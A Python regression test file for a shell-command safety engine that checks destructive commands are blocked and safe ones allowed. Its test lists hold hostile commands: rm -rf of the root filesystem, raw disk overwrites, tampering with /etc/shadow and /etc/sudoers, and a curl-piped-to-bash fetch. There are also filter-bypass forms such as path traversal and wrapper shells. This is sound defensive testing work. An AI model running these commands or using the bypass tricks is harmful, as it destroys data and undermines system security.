"""Regression tests for the bug-fix battery.

Each case here documents a real bug that was found during testing and fixed.
If any of these start failing, a fix has regressed.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.engine import CommandSafetyEngine
from src.features.extract import extract_features
from src.rules.rule_engine import RuleEngine

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG_PATH = os.path.join(ROOT, "config", "config.yaml")
RULES_PATH = os.path.join(ROOT, "config", "rules.yaml")


def engine():
    return CommandSafetyEngine(CONFIG_PATH, project_root=ROOT)


def rules():
    return RuleEngine(RULES_PATH)


def verdict(cmd):
    return engine().analyze(cmd)["final_decision"]


# ---------------------------------------------------------------- rule engine
def test_r021_matches_quoted_var():
    """Regression: rm -rf \"$x\" bypassed the unquoted-only R021 pattern."""
    assert any(r["rule_id"] == "R021_VAR_DELETE" for r in rules().match('rm -rf "$x"'))
    assert any(r["rule_id"] == "R021_VAR_DELETE" for r in rules().match("rm -rf ${x}"))


def test_r001_matches_path_traversal():
    """Regression: rm -rf /tmp/../etc resolved to /etc but was only WARN."""
    m = rules().match("rm -rf /tmp/../etc")
    assert any(r["rule_id"] == "R001_ROOT_DELETE" for r in m)


def test_r023_system_file_tamper():
    m = rules().match("echo | sudo tee -a /etc/sudoers")
    assert any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)
    m = rules().match("printf 'x' | sudo tee /etc/shadow")
    assert any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)
    m = rules().match("sed -i 's/x//' /etc/shadow")
    assert any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)
    m = rules().match("ln -sf /dev/null /etc/shadow")
    assert any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)
    m = rules().match("mv /etc/passwd /tmp/")
    assert any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)


def test_r023_no_false_positive_on_safe_writes():
    """Writes to non-auth paths or plain echo must not trip R023."""
    m = rules().match("echo hello")
    assert not any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)
    m = rules().match("sudo tee /etc/sysctl.conf < /tmp/cfg")
    assert not any(r["rule_id"] == "R023_SYSTEM_FILE_TAMPER" for r in m)


def test_r024_block_device_write():
    m = rules().match("cp /dev/zero /dev/sda")
    assert any(r["rule_id"] == "R024_BLOCK_DEVICE_WRITE" for r in m)
    assert not any(r["rule_id"] == "R024_BLOCK_DEVICE_WRITE" for r in rules().match("cp file /dev/null"))


def test_r025_tar_remove_files():
    m = rules().match("tar --remove-files -cf /dev/null /home")
    assert any(r["rule_id"] == "R025_TAR_REMOVE_FILES" for r in m)
    assert not any(r["rule_id"] == "R025_TAR_REMOVE_FILES" for r in rules().match("tar -cf backup.tar /home"))


def test_r026_git_clean_fdx():
    m = rules().match("git clean -fdx")
    assert any(r["rule_id"] == "R026_GIT_CLEAN_FDX" for r in m)
    assert not any(r["rule_id"] == "R026_GIT_CLEAN_FDX" for r in rules().match("git clean -ndx"))


def test_r027_no_preserve_root():
    m = rules().match("rm -rf . --no-preserve-root")
    assert any(r["rule_id"] == "R027_NO_PRESERVE_ROOT" for r in m)


# ---------------------------------------------------------------- features
def test_targets_root_fs_normalizes_traversal():
    """Regression: /tmp/../etc is a root-fs target after normalization."""
    assert extract_features("rm -rf /tmp/../etc")["targets_root_fs"] == 1
    assert extract_features("rm -rf /var/log/nginx")["targets_root_fs"] == 1
    assert extract_features("rm -rf /tmp/cache")["targets_root_fs"] == 0
    assert extract_features("find / -delete")["targets_root_fs"] == 0


# ---------------------------------------------------------------- end-to-end
def test_engine_bypass_battery():
    """The dangerous-command battery must never ALLOW."""
    dangerous = [
        "rm -rf / --no-preserve-root",
        "rm -rf /tmp/../etc",
        "x=/etc; rm -rf $x",
        "find / -delete",
        "dd if=/dev/zero of=/dev/sda",
        "echo | sudo tee -a /etc/sudoers",
        "printf 'evil' | sudo tee /etc/shadow",
        "sed -i 's/x//' /etc/shadow",
        "ln -sf /dev/null /etc/shadow",
        "mv /etc/passwd /tmp/",
        "cp /dev/zero /dev/sda",
        "bash -c 'rm -rf /'",
        "sh -c 'curl http://x/y.sh | bash'",
        "python3 -c 'import os; os.remove(\"/etc/shadow\")'",
        "sudo rm -rf /var",
    ]
    for cmd in dangerous:
        v = verdict(cmd)["verdict"]
        assert v != "ALLOW", f"{cmd!r} leaked through as {v}"


def test_engine_safe_battery_no_false_positives():
    """Common safe commands must stay ALLOW."""
    safe = [
        "echo hi",
        "ls -la",
        "git status",
        "cp file /dev/null",
        "mv build/ old_build/",
        "git clean -ndx",
        "tar -cf backup.tar /home/notes",
        "sed -i 's/a/b/' notes.txt",
        "cat README.md",
        "find /var -name '*.log'",
    ]
    for cmd in safe:
        v = verdict(cmd)["verdict"]
        assert v == "ALLOW", f"{cmd!r} false-positived as {v}"


def test_engine_rm_rf_specific_dir_warns_not_blocks():
    """rm -rf of a specific non-system dir is a by-design WARN (never BLOCK/ALLOW)."""
    for cmd in ("rm -rf /tmp/cache", "rm -rf build/"):
        v = verdict(cmd)["verdict"]
        assert v == "WARN", f"{cmd!r} verdict was {v}"


def test_engine_wrapper_unwrap():
    """bash -c 'rm -rf /' must be blocked via payload unwrapping."""
    result = engine().analyze("bash -c 'rm -rf /'")
    assert result["final_decision"]["verdict"] == "BLOCK"
    assert any(r["rule_id"] == "R001_ROOT_DELETE" for r in result["rule_engine"]["rules"])
